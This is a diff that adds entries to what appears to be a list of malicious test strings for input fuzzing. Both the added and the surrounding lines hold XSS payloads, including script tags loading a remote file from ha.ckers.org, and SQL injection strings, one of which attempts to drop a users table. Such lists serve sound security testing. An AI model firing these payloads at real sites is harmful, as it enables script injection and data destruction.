@@ -563,6 +563,10 @@ ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 <IMG SRC=" &#14;  javascript:alert('XSS');">
+"<img src='' onerror"javascript:alert()">";
+<img src="" onerror="alert()">
+"<img src="" + onerror="alert()"/>%00 + ".jpg' />";
+<img src="" onerror="alert()"> <script>alert()</script>
 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
@@ -588,6 +592,8 @@ http://a/%%30%30
 ' OR '1'='1
  
 %
+'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
+'SELECT id,username FROM users WHERE id='3' and DROP users . $injection . ' LIMIT 1';
 _
 
 #	Server Code Injection
